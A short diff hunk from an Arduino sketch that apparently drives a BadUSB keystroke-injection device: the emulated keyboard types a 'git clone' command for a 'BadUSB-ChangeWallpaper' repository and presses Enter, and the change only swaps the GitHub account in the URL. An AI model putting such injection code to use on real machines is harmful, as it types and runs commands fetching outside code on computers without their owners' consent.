@@ -24,7 +24,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(1000);
 
-  Keyboard.print("git clone https://github.com/PSZMAJ/BadUSB-ChangeWallpaper.git");
+  Keyboard.print("git clone https://github.com/karolsznajder/BadUSB-ChangeWallpaper.git");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(1000);
